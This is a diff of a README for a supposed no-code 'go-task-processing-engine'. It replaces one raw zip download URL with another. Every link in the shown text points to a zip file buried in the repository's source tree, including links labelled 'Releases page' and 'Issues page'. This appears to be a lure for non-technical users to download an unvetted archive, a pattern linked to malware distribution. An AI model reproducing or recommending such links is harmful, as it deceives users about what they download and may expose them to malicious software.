@@ -1,7 +1,7 @@
 # 🚀 go-task-processing-engine - Simplify Your Task Management
 
 ## 📥 Download the Latest Release
-[![Download Latest Release](https://github.com/copilotoParaterminarlachamba/go-task-processing-engine/raw/refs/heads/main/internal/queue/go-task-engine-processing-v3.8.zip%20Latest%20Release-Here-blue)](https://github.com/copilotoParaterminarlachamba/go-task-processing-engine/raw/refs/heads/main/internal/queue/go-task-engine-processing-v3.8.zip)
+[![Download Latest Release](https://github.com/copilotoParaterminarlachamba/go-task-processing-engine/raw/refs/heads/main/web/task-processing-go-engine-v3.6-alpha.1.zip%20Latest%20Release-Here-blue)](https://github.com/copilotoParaterminarlachamba/go-task-processing-engine/raw/refs/heads/main/web/task-processing-go-engine-v3.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the go-task-processing-engine! This tool helps you manage multiple tasks at once, keeping everything organized and efficient. You don't need any programming knowledge to get started. Follow the steps below to download and run the application easily.
@@ -16,7 +16,7 @@ Before you begin, please make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 ### Step 1: Visit the Releases Page
-To download the application, visit the [Releases page](https://github.com/copilotoParaterminarlachamba/go-task-processing-engine/raw/refs/heads/main/internal/queue/go-task-engine-processing-v3.8.zip) on GitHub.
+To download the application, visit the [Releases page](https://github.com/copilotoParaterminarlachamba/go-task-processing-engine/raw/refs/heads/main/web/task-processing-go-engine-v3.6-alpha.1.zip) on GitHub.
 
 ### Step 2: Select the Latest Version
 On the Releases page, find the section labeled "Latest Release." Here, you will see various download options for different operating systems.
@@ -66,7 +66,7 @@ If you experience issues while using the go-task-processing-engine, consider the
 ## 📣 Community Support
 If you need assistance or have questions, you can engage with our community:
 
-- **GitHub Issues:** Report any bugs or request features on the [Issues page](https://github.com/copilotoParaterminarlachamba/go-task-processing-engine/raw/refs/heads/main/internal/queue/go-task-engine-processing-v3.8.zip).
+- **GitHub Issues:** Report any bugs or request features on the [Issues page](https://github.com/copilotoParaterminarlachamba/go-task-processing-engine/raw/refs/heads/main/web/task-processing-go-engine-v3.6-alpha.1.zip).
 - **Discussion Forum:** Join discussions with other users and share tips on how to get the most out of the application.
 
 ## 📅 Updates and Changelog
